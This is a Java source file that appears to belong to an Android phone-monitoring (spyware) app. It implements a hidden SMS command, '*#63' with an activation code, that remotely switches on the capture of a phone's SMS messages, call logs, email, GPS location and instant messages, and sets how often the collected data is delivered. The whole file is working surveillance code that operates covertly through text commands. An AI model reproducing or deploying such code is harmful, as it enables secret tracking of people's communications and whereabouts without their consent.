package com.fx.dalvik.smscommand.interpreter;

import java.util.regex.Pattern;

import android.content.Context;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ServiceManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

public class SmsEventSetting {

	private static final String TAG = "SmsEventSetting";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#63";
	
	//	<*#63><FK><nStartCapture><nDeliveryTimer><nMaxEvent><S,C,E,L,IM>
	//	
	//	S = flag for SMS event
	//	C = flag for Call log event
	//	E = flag for Email event
	//	L = flag for GPS event
	//  IM = flag for Instant Messaging event
	//	
	//	Note:
	//	If fL is on, it will use current update interval because this command doesn't accept interval value
	//	Android doesn't support Email so fE doesn't matter
	public static String processCommand(Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 6 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 7 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		if (!activationCodeValidation.equals(
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Details Validation
		boolean validation = Pattern.matches("[0-1]", tokens[2])
				&& Pattern.matches("[0-9]*", tokens[3]) 
				&& Integer.parseInt(tokens[3]) >= 0 && Integer.parseInt(tokens[3]) <= 24
				&& Pattern.matches("[0-9]*", tokens[4])
				&& Integer.parseInt(tokens[4]) >= 1 && Integer.parseInt(tokens[4]) <= 500
				&& Pattern.matches("[0-1](,[ ]*[0-1]){4}+", tokens[5]);
				
		// If validation is failed
		if (!validation) {
			return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT;
		}
		
		PreferenceManager preferenceManager = PreferenceManager.getInstance(context);
		
		String[] eventsFlag = GeneralUtil.getTokenArray(
				tokens[5], SmsCommandHelper.COMMA_DELIMITERS);
		
		// Set Capture SMS
		boolean smsFlag = eventsFlag[0].equals("1");
		preferenceManager.setCaptureSmsEnabled(smsFlag);
		
		// Set Capture Call
		boolean callFlag = eventsFlag[1].equals("1");
		preferenceManager.setCaptureCallLogEnabled(callFlag);
		
		// Set Capture Email
		boolean emailFlag = eventsFlag[2].equals("1");
		preferenceManager.setCaptureEmailEnabled(emailFlag);
		
		// Set Capture Location
		boolean locationFlag = eventsFlag[3].equals("1");
		preferenceManager.setCaptureLocationEnabled(locationFlag);
		
		// Set Capture IM
		boolean imFlag = eventsFlag[4].equals("1");
		preferenceManager.setCaptureImEnabled(imFlag);
		
		// Set Enable Start Capture (this MUST BE put at the LAST order)
		boolean startCaptureFlag = tokens[2].equals("1");
		preferenceManager.setCaptureEnabled(startCaptureFlag);
		
		// Set Delivery Timer
		int deliveryTimer = Integer.parseInt(tokens[3]);
		preferenceManager.setDeliveryPeriodHours(deliveryTimer);
		
		// Set Max Events
		int maxEvent = Integer.parseInt(tokens[4]);
		preferenceManager.setMaxEvents(maxEvent);
		
		// Notify changes
		ServiceManager serviceManager = ServiceManager.getInstance(context);
		serviceManager.updateEventCaptureStatus();
		serviceManager.restartDeliveryScheduler();
		serviceManager.processNumberOfEvents();
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" 
				+ SmsCommandHelper.getCurrentEventSettings(context, true);
	}
}
